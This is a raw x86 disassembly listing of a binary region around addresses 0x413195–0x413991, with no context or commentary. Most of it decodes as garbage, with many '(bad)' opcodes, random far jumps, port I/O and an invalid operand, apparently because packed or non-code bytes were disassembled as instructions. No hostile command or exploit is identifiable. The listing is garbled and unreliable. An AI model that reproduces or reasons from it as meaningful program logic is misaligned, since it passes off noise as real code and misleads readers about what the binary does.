  413195:	ds pop es
  413197:	add    al,0xb1
  413199:	jl     0x41312f
  41319b:	sbb    eax,0x171ee0bf
  4131a0:	retf   
  4131a1:	dec    esi
  4131a2:	mul    eax
  4131a4:	mov    ebp,0x8fd4c00d
  4131a9:	xchg   esi,eax
  4131aa:	dec    ecx
  4131ab:	or     esi,edx
  4131ad:	jmp    0x41322b
  4131af:	ja     0x413191
  4131b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b2:	pusha  
  4131b3:	bound  esi,QWORD PTR [edi-0x640b934d]
  4131b9:	mov    bl,0xca
  4131bb:	ret    0x7d9b
  4131be:	inc    esi
  4131bf:	dec    ebx
  4131c0:	int3   
  4131c1:	cli    
  4131c2:	mov    ecx,0x75aff39b
  4131c7:	sub    DWORD PTR [edx-0x7f],esi
  4131ca:	shl    DWORD PTR [edx+0x6e],0xaa
  4131ce:	dec    esp
  4131cf:	js     0x413191
  4131d1:	jl     0x413241
  4131d3:	mov    gs,ebx
  4131d5:	add    BYTE PTR [esi+0x6f0e8708],bh
  4131db:	jp     0x413216
  4131dd:	retf   0x47ae
  4131e0:	pop    edi
  4131e1:	jnp    0x413219
  4131e3:	cmp    eax,0xf5364df6
  4131e8:	fist   DWORD PTR [ebp+0x7707ea13]
  4131ee:	mov    ch,0x89
  4131f0:	sub    eax,0xfddad068
  4131f5:	push   ebp
  4131f6:	jle    0x413270
  4131f8:	(bad)  
  4131f9:	xchg   edi,eax
  4131fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131fb:	stos   BYTE PTR es:[edi],al
  4131fc:	sub    BYTE PTR [eax+0x162cb168],bl
  413202:	push   eax
  413203:	pop    eax
  413204:	pop    esp
  413205:	lods   al,BYTE PTR ds:[esi]
  413206:	push   es
  413207:	sub    eax,0xb4d2cf1b
  41320c:	sbb    eax,0x7ee47484
  413211:	pop    esp
  413212:	add    eax,0x1e2d3060
  413217:	pop    esi
  413218:	jns    0x41327f
  41321a:	ret    
  41321b:	(bad)  
  41321c:	hlt    
  41321d:	and    BYTE PTR [edi-0x2f],ah
  413220:	imul   esp,DWORD PTR [ebx-0x13],0x96375300
  413227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413228:	xor    BYTE PTR [edx+0x3cefbbf],0xbf
  41322f:	dec    ebx
  413230:	sbb    dh,BYTE PTR [esi]
  413232:	leave  
  413233:	and    eax,0x2f550647
  413238:	push   edx
  413239:	jecxz  0x4131fb
  41323b:	inc    esp
  41323c:	mov    dl,0xfe
  41323e:	cmp    DWORD PTR [edi+0xf87f124],eax
  413244:	loopne 0x413238
  413246:	clc    
  413247:	imul   esi,DWORD PTR [edi+0x73],0x5c
  41324b:	cmp    eax,0x5032cef6
  413250:	mov    ds:0x1bb3292d,al
  413255:	sbb    BYTE PTR [edx+0x43],ah
  413258:	xor    ch,ah
  41325a:	fist   DWORD PTR [esi+ebp*2-0x1e]
  41325e:	dec    esp
  41325f:	(bad)  
  413260:	enter  0xea43,0x53
  413264:	shrd   edi,esp,cl
  413267:	rcl    DWORD PTR [ecx],1
  413269:	shr    DWORD PTR [edi+0x57],cl
  41326c:	test   eax,0x21331aec
  413271:	and    edx,esi
  413273:	xor    edx,DWORD PTR [ebx+0x7acc431]
  413279:	mov    ds:0x25a520,eax
  41327e:	jg     0x41320e
  413280:	popf   
  413281:	popa   
  413282:	aad    0x96
  413284:	cmp    eax,0x72f15db8
  413289:	adc    DWORD PTR [esi-0x2],0x22
  41328d:	xor    BYTE PTR [eax],dl
  41328f:	hlt    
  413290:	adc    DWORD PTR [edx+0x4648c8b9],edx
  413296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413297:	dec    esi
  413298:	fisubr DWORD PTR [esi-0x70e2b7bf]
  41329e:	sub    eax,0xb67852e3
  4132a3:	pop    edx
  4132a4:	dec    esp
  4132a5:	das    
  4132a6:	popf   
  4132a7:	xchg   ebp,eax
  4132a8:	pop    ecx
  4132a9:	loopne 0x4132db
  4132ab:	in     al,0x4
  4132ad:	dec    ecx
  4132ae:	(bad)  
  4132af:	sbb    dh,dh
  4132b1:	jmp    0xf75ca9b
  4132b6:	xor    ebp,eax
  4132b8:	mov    dl,0x0
  4132ba:	mov    eax,ds:0x6dc9c5d8
  4132bf:	out    0x63,eax
  4132c1:	mov    esi,0x3e415f01
  4132c6:	add    al,0x44
  4132c8:	(bad)  
  4132c9:	fdiv   QWORD PTR [ebp+0x4a71857]
  4132cf:	xor    ebp,DWORD PTR [eax]
  4132d1:	jne    0x413304
  4132d3:	sub    al,cl
  4132d5:	adc    BYTE PTR [ebx-0xffaecad],dl
  4132db:	or     BYTE PTR [esi],0xb
  4132de:	push   cs
  4132df:	ins    DWORD PTR es:[edi],dx
  4132e0:	cmp    al,0xa3
  4132e2:	mov    bh,0xe0
  4132e4:	mov    esi,0xe05fabc6
  4132e9:	sbb    ebx,DWORD PTR [edi-0x3f]
  4132ec:	mov    dl,0xae
  4132ee:	push   ebx
  4132ef:	push   ebp
  4132f0:	hlt    
  4132f1:	in     eax,0xf6
  4132f3:	comiss xmm2,DWORD PTR [esi-0x2adf92e9]
  4132fa:	shr    ah,0x1f
  4132fd:	lods   al,BYTE PTR ds:[esi]
  4132fe:	fs jg  0x413347
  413301:	int3   
  413302:	push   cs
  413303:	arpl   WORD PTR [ebx-0x7835a516],dx
  413309:	fs test al,0xc0
  41330c:	mov    dl,0x86
  41330e:	rol    ecx,1
  413310:	xor    al,0xed
  413312:	cwde   
  413313:	add    ebp,ebx
  413315:	fcomp  DWORD PTR [edx+0x2e361168]
  41331b:	cmp    BYTE PTR [esp+esi*1],cl
  41331e:	into   
  41331f:	xor    ah,ah
  413321:	mov    cl,0xde
  413323:	stos   BYTE PTR es:[edi],al
  413324:	in     al,dx
  413325:	out    0xf9,eax
  413327:	xor    DWORD PTR [ebp-0x6ca15fdc],ecx
  41332d:	and    ecx,edi
  41332f:	fs cs push ebp
  413332:	inc    esp
  413333:	push   ecx
  413334:	jge    0x413305
  413336:	test   dl,bl
  413338:	cld    
  413339:	sbb    DWORD PTR [ebx-0x7e8a1bc2],edx
  41333f:	out    0x16,eax
  413341:	xchg   edi,eax
  413342:	in     eax,dx
  413343:	out    dx,eax
  413344:	push   cs
  413345:	xchg   ebx,eax
  413346:	repnz sets BYTE PTR ds:0x3bbe2336
  41334e:	pop    es
  41334f:	div    ah
  413351:	jecxz  0x41338b
  413353:	nop
  413354:	sub    cl,BYTE PTR [edi-0x28bd54be]
  41335a:	in     eax,dx
  41335b:	mov    ah,0x92
  41335d:	mov    esi,0x35785987
  413362:	mov    ch,0x8b
  413364:	pushf  
  413365:	ret    
  413366:	sbb    DWORD PTR [ebx],ebp
  413368:	add    BYTE PTR [esi],ah
  41336a:	or     al,BYTE PTR [edx+0x3f]
  41336d:	inc    esp
  41336e:	dec    eax
  41336f:	adc    DWORD PTR [eax],esp
  413371:	ret    
  413372:	inc    esp
  413373:	scas   al,BYTE PTR es:[edi]
  413374:	mov    ebp,ebx
  413376:	fist   WORD PTR [ebx+0x3cd63378]
  41337c:	jp     0x413341
  41337e:	aas    
  41337f:	add    BYTE PTR [ebp-0x7f05e48b],bh
  413385:	add    al,0xd3
  413387:	das    
  413388:	cli    
  413389:	out    dx,al
  41338a:	out    dx,eax
  41338b:	retf   
  41338c:	mov    cl,0x81
  41338e:	mov    dh,0x70
  413390:	pop    ds
  413391:	scas   al,BYTE PTR es:[edi]
  413392:	sbb    esp,ebx
  413394:	mov    al,0x71
  413396:	add    al,0xcc
  413398:	jg     0x413396
  41339a:	jne    0x41336d
  41339c:	mov    ah,0x7e
  41339e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41339f:	into   
  4133a0:	pop    ebp
  4133a1:	fmul   QWORD PTR [ebp+0x7359abd7]
  4133a7:	xchg   esp,eax
  4133a8:	xor    eax,0x678c6bdd
  4133ad:	mov    al,0x9e
  4133af:	and    DWORD PTR [edi+0x28396714],ebx
  4133b5:	(bad)  
  4133b6:	pusha  
  4133b7:	mov    ebx,es
  4133b9:	sbb    DWORD PTR [ecx-0x7e],eax
  4133bc:	dec    eax
  4133bd:	mov    ebp,0x295a3e3d
  4133c2:	aaa    
  4133c3:	(bad)  [ebp-0x40989feb]
  4133c9:	out    dx,al
  4133ca:	push   esp
  4133cb:	retf   
  4133cc:	loope  0x4133e3
  4133ce:	jmp    0xe24ef12b
  4133d3:	pop    ds
  4133d4:	call   edi
  4133d6:	dec    esi
  4133d7:	jmp    0x4133e5
  4133d9:	ins    BYTE PTR es:[edi],dx
  4133da:	adc    BYTE PTR [esi],bl
  4133dc:	and    bh,BYTE PTR [eax-0x5f69af52]
  4133e2:	mov    dh,0x2f
  4133e4:	push   esp
  4133e5:	dec    ebx
  4133e6:	fs stos BYTE PTR es:[edi],al
  4133e8:	(bad)  
  4133e9:	push   ss
  4133ea:	fnstcw WORD PTR [edi-0xa]
  4133ed:	xor    ecx,DWORD PTR [edx-0x27]
  4133f0:	sub    eax,0xeddbad66
  4133f5:	inc    ebp
  4133f6:	push   0x7a
  4133f8:	lods   eax,DWORD PTR ds:[esi]
  4133f9:	dec    esp
  4133fa:	or     BYTE PTR [esi],ah
  4133fc:	js     0x41345d
  4133fe:	aas    
  4133ff:	data16 clc 
  413401:	dec    edi
  413402:	xchg   edx,eax
  413403:	aam    0x94
  413405:	mov    dh,0xd0
  413407:	mov    ds:0x81485695,al
  41340c:	out    0x50,al
  41340e:	(bad)  
  41340f:	test   al,0x92
  413411:	pop    ecx
  413412:	js     0x41339f
  413414:	sbb    eax,0x6939cd66
  413419:	jmp    0x946abe43
  41341e:	push   ds
  41341f:	jne    0x41346d
  413421:	jmp    0x6fa6:0xb85c1088
  413428:	sar    DWORD PTR [esi],1
  41342a:	sbb    DWORD PTR [ebp+0xeda1e15],edx
  413430:	or     cl,BYTE PTR [ebp-0x66f0a58c]
  413436:	jns    0x413496
  413438:	dec    edi
  413439:	loope  0x413497
  41343b:	cs out dx,al
  41343d:	push   edx
  41343e:	test   BYTE PTR [eax],bl
  413440:	sbb    al,0xed
  413442:	scas   eax,DWORD PTR es:[edi]
  413443:	lahf   
  413444:	xchg   ebp,eax
  413445:	and    al,0xf1
  413447:	daa    
  413448:	mov    eax,ds:0x67fbcc95
  41344d:	jmp    0x18b5:0x35428396
  413454:	(bad)  
  413455:	and    BYTE PTR [edx+0xf],cl
  413458:	pop    edi
  413459:	sti    
  41345a:	xor    ah,BYTE PTR ds:0x683b5201
  413460:	push   edx
  413461:	inc    eax
  413462:	lock pop esi
  413464:	mov    bh,dl
  413466:	(bad)  
  413468:	call   0x29c6:0xdc7
  41346e:	jl     0x4134b2
  413470:	push   ds
  413471:	dec    BYTE PTR [edi+0x21]
  413474:	mov    bl,0x7c
  413476:	lods   al,BYTE PTR ds:[esi]
  413477:	push   0xaf94f68f
  41347c:	add    eax,0xbe7d2a25
  413481:	rcr    edx,cl
  413483:	div    BYTE PTR [edx-0x7d79eaea]
  413489:	std    
  41348a:	fmul   DWORD PTR [edi+0x39]
  41348d:	mov    eax,ds:0xfb1eeda3
  413492:	aas    
  413493:	es dec ebx
  413495:	push   eax
  413496:	test   DWORD PTR [esi-0x566c1e3a],0x28b7a509
  4134a0:	iret   
  4134a1:	fldenv [esp+edi*1+0x73d281ec]
  4134a8:	xchg   ebp,eax
  4134a9:	add    BYTE PTR [eax],al
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x42206f
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x33d2709f]
  4134d4:	jno    0x413486
  4134d6:	fs inc edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    cl,bl
  4134df:	jns    0x41354c
  4134e1:	das    
  4134e2:	scas   al,BYTE PTR es:[edi]
  4134e3:	rcr    DWORD PTR [eax],1
  4134e5:	xchg   esi,eax
  4134e6:	push   esp
  4134e7:	jmp    DWORD PTR [edi-0x34]
  4134ea:	pop    es
  4134eb:	adc    ah,BYTE PTR [ebp+0x48ef7edf]
  4134f1:	jne    0x41354a
  4134f3:	push   0xfe9609dd
  4134f8:	cmp    ebp,eax
  4134fa:	sbb    DWORD PTR [ebx-0x65531c23],0x73
  413501:	or     eax,0x33b46620
  413506:	or     bl,al
  413508:	aaa    
  413509:	and    ebp,DWORD PTR [edi]
  41350b:	shr    DWORD PTR [ebp+0x2e9d48e7],1
  413511:	retf   
  413512:	push   ds
  413513:	adc    al,0xbc
  413515:	mov    eax,0xb82f3070
  41351a:	cmp    DWORD PTR [ebp+0xc4e6fc4],edx
  413520:	loop   0x413591
  413522:	idiv   DWORD PTR [ebp+0xbfabab0]
  413528:	pusha  
  413529:	imul   esi,DWORD PTR [eax+0x3c],0x74
  41352d:	imul   esp,DWORD PTR [eax+0x40],0x7d
  413531:	popf   
  413532:	test   al,0x7c
  413534:	push   0x52
  413536:	jp     0x4134ec
  413538:	mov    eax,0xc48a0354
  41353d:	in     al,dx
  41353e:	stos   BYTE PTR es:[edi],al
  41353f:	jl     0x41354b
  413541:	loope  0x4134ee
  413543:	sbb    BYTE PTR [edx-0x5e153d5a],bl
  413549:	mov    esp,0x832c7344
  41354e:	loopne 0x41356e
  413550:	lea    esi,[esi*2-0x40729b3a]
  413557:	xor    esp,esi
  413559:	fstp   DWORD PTR [eax-0x2b0931f1]
  41355f:	jecxz  0x4134e4
  413561:	adc    bl,BYTE PTR [ecx]
  413563:	loope  0x413525
  413565:	mov    ah,0xd8
  413567:	fisubr DWORD PTR [ebp+0x71]
  41356a:	push   ss
  41356b:	adc    BYTE PTR [edi+0x6c252fd],ch
  413571:	test   eax,0x3851b9e9
  413576:	mov    eax,0xc7d562db
  41357b:	inc    edx
  41357c:	mov    ah,0xd
  41357e:	gs ins BYTE PTR es:[edi],dx
  413580:	push   es
  413581:	int    0x99
  413583:	outs   dx,BYTE PTR gs:[esi]
  413585:	cmp    edi,DWORD PTR [eax-0x50d88c6]
  41358b:	stos   BYTE PTR es:[edi],al
  41358c:	ss das 
  41358e:	jbe    0x413591
  413590:	sbb    BYTE PTR [ecx+0x453a2052],bl
  413596:	push   0xffffffa8
  413598:	jae    0x41357a
  41359a:	shl    BYTE PTR ds:0xe95eac96,0x9
  4135a1:	mov    bl,0x20
  4135a3:	adc    eax,0xb9b673ea
  4135a8:	aaa    
  4135a9:	retf   
  4135aa:	fstp   TBYTE PTR [ecx-0x36]
  4135ad:	adc    BYTE PTR [eax+0x4d],0xae
  4135b1:	call   0xea00:0x654dd16a
  4135b8:	leave  
  4135b9:	(bad)  
  4135ba:	jo     0x4135a9
  4135bc:	nop
  4135bd:	cmp    bl,BYTE PTR [ebx+0x71]
  4135c0:	inc    eax
  4135c1:	adc    eax,ecx
  4135c3:	inc    esi
  4135c4:	stc    
  4135c5:	cmc    
  4135c6:	mov    dh,0xf6
  4135c8:	add    cl,cl
  4135ca:	imul   esp,DWORD PTR [ebp-0x7e],0x7864208e
  4135d1:	dec    eax
  4135d2:	adc    BYTE PTR [ebp+0x4],ah
  4135d5:	(bad)  
  4135d6:	jmp    0x347:0x389724bf
  4135dd:	and    bh,BYTE PTR [ecx+edi*4]
  4135e0:	(bad)  
  4135e1:	retf   
  4135e2:	mov    bh,0x96
  4135e4:	in     eax,dx
  4135e5:	ror    BYTE PTR [eax+eiz*4],cl
  4135e8:	xor    DWORD PTR [eax+0x5ee62f1f],ebp
  4135ee:	add    esi,DWORD PTR [ebx]
  4135f0:	aam    0x47
  4135f2:	mov    bl,BYTE PTR [ecx-0x59a54c1e]
  4135f8:	in     al,dx
  4135f9:	stos   DWORD PTR es:[edi],eax
  4135fa:	mov    cs,WORD PTR [edx]
  4135fc:	(bad)  
  4135fd:	int    0xe6
  4135ff:	adc    DWORD PTR [ecx+ecx*8],eax
  413602:	hlt    
  413603:	in     eax,dx
  413604:	repz push esi
  413606:	adc    BYTE PTR [esi-0x53],bl
  413609:	mov    ecx,0xfa241397
  41360e:	fsubr  QWORD PTR [ecx]
  413610:	jo     0x413657
  413612:	cmp    ebp,ecx
  413614:	push   ecx
  413615:	loop   0x413695
  413617:	and    eax,DWORD PTR [eax-0x46]
  41361a:	addr16 leave 
  41361c:	jae    0x4135df
  41361e:	or     eax,DWORD PTR [edx+0x721b1e78]
  413624:	fdiv   DWORD PTR [ecx-0x7b11e986]
  41362a:	jecxz  0x41368e
  41362c:	push   esi
  41362d:	imul   esi,DWORD PTR [ebx],0x13
  413630:	adc    bh,BYTE PTR [ebx]
  413632:	data16 mov ah,BYTE PTR [ecx]
  413635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413636:	jle    0x413633
  413638:	test   eax,0x5084dad
  41363d:	xchg   edi,eax
  41363e:	pop    ds
  41363f:	(bad)  
  413640:	in     al,0xfc
  413642:	aaa    
  413643:	ret    
  413644:	fisttp QWORD PTR ds:0xd3847b09
  41364a:	adc    eax,0x39ee449a
  41364f:	sbb    DWORD PTR [edx+0xe],0xffffffdd
  413653:	dec    eax
  413654:	inc    ebx
  413655:	ins    DWORD PTR es:[edi],dx
  413656:	mov    esp,DWORD PTR [esp+edx*2]
  413659:	sar    ah,cl
  41365b:	popf   
  41365c:	xchg   esp,ebp
  41365e:	cmp    BYTE PTR [esi-0x7b6c601d],bl
  413664:	jge    0x413660
  413666:	mov    ?,WORD PTR [edi]
  413668:	mov    dl,0xef
  41366a:	xchg   ebx,eax
  41366b:	sahf   
  41366c:	lock pushf 
  41366e:	cmp    DWORD PTR [ebp+0x2790e4f3],ebx
  413674:	xchg   ecx,eax
  413675:	sub    BYTE PTR [edx+esi*2-0x7dd5234],al
  41367c:	pusha  
  41367d:	fwait
  41367e:	(bad)  
  41367f:	out    dx,eax
  413680:	popf   
  413681:	and    al,0xb0
  413683:	and    eax,0xc247ed03
  413688:	jg     0x41362f
  41368a:	outs   dx,BYTE PTR ds:[esi]
  41368b:	call   0xaa5c:0xe864c23c
  413692:	jmp    0x2a94f446
  413697:	mov    eax,DWORD PTR [esi+ebx*2+0x9a4b77a]
  41369e:	ja     0x4136b9
  4136a0:	xchg   esi,eax
  4136a1:	xchg   ebp,eax
  4136a2:	call   0x57bc:0x575bc15f
  4136a9:	or     eax,0xb8ead5bf
  4136ae:	inc    esi
  4136af:	lods   al,BYTE PTR ds:[esi]
  4136b0:	dec    edx
  4136b1:	sbb    al,0xb
  4136b3:	call   0xc734:0x93779018
  4136ba:	inc    edi
  4136bb:	icebp  
  4136bc:	or     BYTE PTR [esi],cl
  4136be:	push   esp
  4136bf:	out    dx,eax
  4136c0:	pusha  
  4136c1:	sar    DWORD PTR [eax-0x1212486e],1
  4136c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136c8:	sbb    BYTE PTR [esi],ch
  4136ca:	xor    BYTE PTR [ecx-0x24],dl
  4136cd:	inc    ebp
  4136ce:	sbb    al,BYTE PTR [ebx+0x63df1026]
  4136d4:	loopne 0x4136db
  4136d6:	iret   
  4136d7:	mov    ebx,0x29dde24f
  4136dc:	xor    BYTE PTR [eax*8+0xb371209],0xcd
  4136e4:	cmp    cl,bl
  4136e6:	jns    0x4136d2
  4136e8:	(bad)  
  4136e9:	aas    
  4136ea:	mov    edi,0x11a92d3f
  4136ef:	jmp    DWORD PTR [eax-0x42]
  4136f2:	pushf  
  4136f3:	stos   DWORD PTR es:[edi],eax
  4136f4:	mov    edx,0x9c2d7698
  4136f9:	imul   ecx,DWORD PTR [ebp-0x7ddf01ec],0x1120312b
  413703:	dec    esi
  413704:	mov    ch,0xfe
  413706:	fiadd  WORD PTR [edi]
  413708:	daa    
  413709:	(bad)  
  41370a:	loope  0x4136de
  41370c:	cld    
  41370d:	pop    ebx
  41370e:	push   0xffffffcd
  413710:	mov    ds:0x69928d6d,eax
  413715:	add    al,0xd2
  413717:	mov    edi,0xf1233c
  41371c:	dec    edx
  41371d:	cli    
  41371e:	shr    BYTE PTR [edi-0x3b464a0f],0x5d
  413725:	nop
  413726:	(bad)  
  413727:	into   
  413728:	mov    eax,0xda6ef9de
  41372d:	xchg   edi,eax
  41372e:	push   ebx
  41372f:	sbb    DWORD PTR [eax+0x36],esp
  413732:	lods   al,BYTE PTR ds:[esi]
  413733:	fadd   st(2),st
  413735:	xchg   edi,eax
  413736:	cmp    ebp,esp
  413738:	out    dx,eax
  413739:	fadd   st,st(4)
  41373b:	inc    ecx
  41373c:	cmc    
  41373d:	push   es
  41373e:	ss pop esi
  413740:	out    0x8,al
  413742:	xchg   BYTE PTR [edi+0x7b],cl
  413745:	push   ecx
  413746:	jo     0x4136de
  413748:	call   0x3eb0a99d
  41374d:	out    dx,eax
  41374e:	push   0xf2ede14b
  413753:	jnp    0x413701
  413755:	adc    esp,DWORD PTR ds:0xa2387b9
  41375b:	fcomp  DWORD PTR [ebp+0x68603e41]
  413761:	xchg   ebp,eax
  413762:	test   BYTE PTR [ebx],ah
  413764:	fimul  DWORD PTR [edi]
  413766:	pop    es
  413767:	pop    es
  413768:	idiv   DWORD PTR [ebp+0x609ffde9]
  41376e:	repz aaa 
  413770:	nop
  413771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413772:	pop    ss
  413773:	loopne 0x413770
  413775:	scas   eax,DWORD PTR es:[edi]
  413776:	xor    bl,bh
  413778:	push   es
  413779:	test   dl,al
  41377b:	js     0x4137b8
  41377d:	pop    eax
  41377e:	add    BYTE PTR [esi],0x49
  413781:	and    esi,edi
  413783:	shl    DWORD PTR [ebp-0x43],1
  413786:	sbb    BYTE PTR [ebx+ebp*8],0x5d
  41378a:	push   edi
  41378b:	lahf   
  41378c:	nop    DWORD PTR [eax+0x18]
  413790:	mov    esp,0xf3ef32fe
  413795:	sbb    ebx,DWORD PTR [ecx+edx*2]
  413798:	out    dx,al
  413799:	mov    ebp,0xadb2e58a
  41379e:	pusha  
  41379f:	jbe    0x413750
  4137a1:	fwait
  4137a2:	imul   esp,DWORD PTR [esi+0x2b],0xfa4f5648
  4137a9:	xchg   esi,eax
  4137aa:	(bad)  
  4137ab:	les    edx,FWORD PTR [ebx]
  4137ad:	stc    
  4137ae:	jno    0x4137f0
  4137b0:	lods   eax,DWORD PTR ds:[esi]
  4137b1:	add    eax,0xffffffe8
  4137b4:	sub    eax,0xb156a804
  4137b9:	arpl   WORD PTR [ecx+0x27],bp
  4137bc:	jb     0x413805
  4137be:	pop    esp
  4137c0:	stc    
  4137c1:	in     al,dx
  4137c2:	jmp    0x413841
  4137c4:	pop    esp
  4137c5:	xor    edx,DWORD PTR [edi-0x353d725b]
  4137cb:	inc    edx
  4137cc:	pop    ebp
  4137cd:	and    eax,DWORD PTR [edx]
  4137cf:	add    al,0xb9
  4137d1:	out    dx,al
  4137d2:	(bad)  
  4137d3:	out    0xdf,eax
  4137d5:	mov    bl,0x74
  4137d7:	adc    eax,0x7bfa3f19
  4137dc:	(bad)  
  4137dd:	mov    dh,BYTE PTR [ecx+0x45]
  4137e0:	sbb    edi,DWORD PTR [ebx-0x7d85a46e]
  4137e6:	repnz shl DWORD PTR [ecx-0x24],1
  4137ea:	mov    dl,0xe2
  4137ec:	or     al,0xe6
  4137ee:	fisub  DWORD PTR [ecx]
  4137f0:	dec    ecx
  4137f1:	xor    BYTE PTR ds:0xdc1e69a,bh
  4137f7:	(bad)  
  4137f8:	pop    ecx
  4137f9:	gs mov esi,0xe036cdf3
  4137ff:	fwait
  413800:	dec    edi
  413801:	out    dx,al
  413802:	fsubr  QWORD PTR [edi+0x11c728cf]
  413808:	xchg   esp,eax
  413809:	cmp    edi,DWORD PTR [ebp+0x3f]
  41380c:	xchg   ebx,eax
  41380d:	add    eax,0x1723bda0
  413812:	jmp    0x41379a
  413814:	loope  0x4137e5
  413816:	arpl   WORD PTR fs:[ebp+0x201abdc7],sp
  41381d:	aam    0xf
  41381f:	int3   
  413820:	xor    eax,0x62db3adf
  413825:	fcomp  DWORD PTR [edi-0x7fd4f45c]
  41382b:	into   
  41382c:	int    0x32
  41382e:	cmp    ebx,eax
  413830:	or     DWORD PTR [ebx],ecx
  413832:	sub    al,0x58
  413834:	dec    edx
  413835:	mov    ah,0x32
  413837:	ficomp DWORD PTR [edi-0x5400c4f1]
  41383d:	pop    es
  41383e:	jg     0x41387a
  413840:	lahf   
  413841:	sub    DWORD PTR [esi],esp
  413843:	and    eax,0x5e976017
  413848:	jae    0x4137e4
  41384a:	daa    
  41384b:	mov    eax,ebx
  41384d:	retf   0x8778
  413850:	xchg   ecx,eax
  413851:	ss sub ecx,edi
  413854:	lock mov ebx,0xf2226426
  41385a:	(bad)  
  41385b:	(bad)  
  41385c:	jne    0x4138da
  41385e:	gs and al,0x58
  413861:	loop   0x4138d4
  413863:	mov    ss,WORD PTR [ebx]
  413865:	mov    esi,0x26e56b6e
  41386a:	pop    ecx
  41386b:	dec    esi
  41386c:	les    esp,FWORD PTR [ebp-0x24]
  41386f:	(bad)  
  413870:	lock dec esi
  413872:	fwait
  413873:	xchg   ebp,eax
  413874:	ins    DWORD PTR es:[edi],dx
  413875:	push   ebx
  413876:	scas   eax,DWORD PTR es:[edi]
  413877:	stc    
  413878:	mov    esi,0x3a08fb17
  41387d:	dec    ebx
  41387e:	rcr    DWORD PTR [eax+ebx*2+0x69],cl
  413882:	call   0xa6e4:0x22a91cda
  413889:	mov    dl,0xa0
  41388b:	div    BYTE PTR [ecx-0x5e]
  41388e:	xchg   BYTE PTR [edx+eiz*2-0x2f],ch
  413892:	out    0xd8,eax
  413894:	(bad)  
  413896:	mov    edx,0x5d8be3f5
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0x7d],ebp
  4138e5:	jl     0x4138c2
  4138e7:	jle    0x4138e0
  4138e9:	cmp    bl,BYTE PTR [eax]
  4138eb:	sbb    BYTE PTR [edx-0x10e7e7ee],ch
  4138f1:	retf   0xf927
  4138f4:	mov    dh,0xb1
  4138f6:	bound  ebx,QWORD PTR [edi+0x6c3ba339]
  4138fc:	xor    ah,BYTE PTR [esi]
  4138fe:	jmp    0xa3ea:0x8e9cedbe
  413905:	arpl   WORD PTR [esp+esi*8],dx
  413908:	xchg   ebx,eax
  413909:	popf   
  41390a:	mov    WORD PTR [ebx],ds
  41390c:	ss clc 
  41390e:	sub    BYTE PTR [ecx],bh
  413910:	fcmovu st,st(3)
  413912:	inc    edi
  413913:	nop
  413914:	mov    ebx,DWORD PTR [ebp+0x36]
  413917:	int3   
  413918:	cli    
  413919:	(bad)  
  41391a:	test   BYTE PTR [ecx+0xec0617b],cl
  413920:	call   0xa2fc:0xb743ad36
  413927:	jge    0x4138fd
  413929:	xchg   ebx,eax
  41392a:	jmp    0x72cf07a8
  41392f:	sub    dh,BYTE PTR [ebp-0x49c5f32f]
  413935:	inc    ecx
  413936:	dec    esp
  413938:	or     al,0xfd
  41393a:	inc    ebx
  41393b:	retf   
  41393c:	cmp    dl,bl
  41393e:	mov    dh,0x9b
  413940:	dec    ebx
  413941:	push   eax
  413942:	or     eax,0x1f9ed01c
  413947:	push   0xffffff99
  413949:	fwait
  41394a:	ja     0x4138fa
  41394c:	hlt    
  41394d:	jle    0x4138d8
  41394f:	ins    DWORD PTR es:[edi],dx
  413950:	push   esp
  413951:	jl     0x413933
  413953:	int3   
  413954:	add    bh,ch
  413956:	push   cs
  413957:	imul   eax,ebx,0x27
  41395a:	(bad)  
  41395c:	cmp    BYTE PTR [eax+edx*1+0x1525d9ec],dl
  413963:	jle    0x413953
  413965:	mov    eax,0x815466
  41396a:	sbb    bh,ah
  41396c:	xor    al,0xc2
  41396e:	stos   DWORD PTR es:[edi],eax
  41396f:	call   0x36cf6c2c
  413974:	mov    BYTE PTR [esi+0x71],cl
  413977:	pop    edx
  413978:	rcl    BYTE PTR [esi+0x68f1b43a],cl
  41397e:	pop    ebx
  41397f:	sbb    eax,0x2d6e7d58
  413984:	out    dx,eax
  413985:	outs   dx,DWORD PTR ds:[esi]
  413986:	mov    ecx,0x2ee23304
  41398b:	cmc    
  41398c:	mov    ch,0x8
  41398e:	stc    
  41398f:	outs   dx,BYTE PTR ds:[esi]
  413990:	pop    ebp
  413991:	xchg   DWORD PTR [eax],edx
